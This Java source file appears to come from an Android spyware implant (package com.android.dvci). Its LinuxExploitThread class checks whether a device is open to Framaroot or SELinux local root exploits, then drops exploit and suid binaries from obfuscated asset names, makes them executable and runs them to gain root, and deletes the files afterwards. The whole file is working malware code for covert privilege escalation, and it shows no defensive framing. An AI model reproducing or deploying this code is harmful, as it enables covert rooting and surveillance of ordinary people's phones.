package com.android.dvci;

import com.android.dvci.auto.Cfg;
import com.android.dvci.capabilities.PackageInfo;
import com.android.dvci.file.AutoFile;
import com.android.dvci.util.Check;
import com.android.dvci.util.Execute;
import com.android.dvci.util.ExecuteResult;
import com.android.dvci.util.Utils;
import com.android.mm.M;

import java.io.File;
import java.io.InputStream;
import java.util.concurrent.Semaphore;

/**
 * Created by zeno on 21/08/14.
 */
class LinuxExploitThread implements Runnable {
	private static final String TAG = "selinuxExploitThread";
	private final boolean frama;
	private final boolean selinux;

	Semaphore semaphore = new Semaphore(1);

	public LinuxExploitThread(boolean frama, boolean selinux) {
		this.frama = frama;
		this.selinux = selinux;
	}

	@Override
	public void run() {

		try {
			if (!semaphore.tryAcquire()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (exploitPhone), already exploiting");
				}
				return;
			}

			if (frama) {
				if (Root.checkFramarootExploitability()) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (exploitPhone): Device seems frama exploitable"); //$NON-NLS-1$
					}
					Root.method = M.e("framaroot");
					runFramalinuxExploit();
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (exploitPhone), not exploitable by Framaroot");
					}
				}
			}

			if (selinux && PackageInfo.checkRoot() == false) {
				if (Root.checkSELinuxExploitability()) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (exploitPhone): SELinux Device seems locally exploitable"); //$NON-NLS-1$
					}
					Root.method = M.e("selinux");
					runSelinuxExploit();
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (exploitPhone), not exploitable by Selinux");
					}
				}
			}

		} finally {
			semaphore.release();
		}

	}

	public void runFramalinuxExploit() {
		Root.framarootExploit();
	}

	public void runSelinuxExploit() {
		final File filesPath = Status.getAppContext().getFilesDir();
		final String path = filesPath.getAbsolutePath();
		final String localExploit = M.e("vs"); // selinux_exploit
		final String selinuxSuidext = M.e("qj"); // selinux_suidext
		final String suidext = M.e("ss"); // suidext (standard)

		AutoFile vs = new AutoFile(path, localExploit);
		if (vs.exists()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (runSelinuxExploit) localexploit running?");
			}
			return;
		}

		try {
			InputStream streamExpl = Utils.getAssetStream(M.e("gb.data")); // selinux_exploit
			InputStream streamSelinuxSuidext = Utils.getAssetStream(M.e("jb.data")); // selinux_suidext
			// rilcap
			InputStream streamSuidext = Utils.getAssetStream(M.e("sb.data")); // suidext

			Root.fileWrite(localExploit, streamExpl, Cfg.RNDDB);
			Root.fileWrite(selinuxSuidext, streamSelinuxSuidext, Cfg.RNDDB);
			Root.fileWrite(suidext, streamSuidext, Cfg.RNDDB);

			String args = String.format(M.e("%s/%s %s/%s %s/%s"),
					path, localExploit, path, selinuxSuidext, path, suidext);

			Execute.execute(M.e("/system/bin/chmod 755 ") + args);

			// Run SELinux exploit
			// - argv[1]: path assoluto alla nuova shell
			// - argv[2]: path assoluto alla vecchia shell
			//String pack = Status.getAppContext().getPackageName();

			if (Cfg.DEBUG) {
				Check.log(TAG + " (runSelinuxExploit), executing exploit");
			}
			int ret = Execute.execute(args).exitCode;
			if (Cfg.DEBUG) {
				Check.log(TAG + " (runSelinuxExploit), execution result: " + ret);
			}

		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (runSelinuxExploit): Exception"); //$NON-NLS-1$
			}

			return;
		} finally {
			File file = new File(path, localExploit);
			file.delete();

			file = new File(path, selinuxSuidext);
			file.delete();

			file = new File(path, suidext);
			file.delete();
		}
	}
}
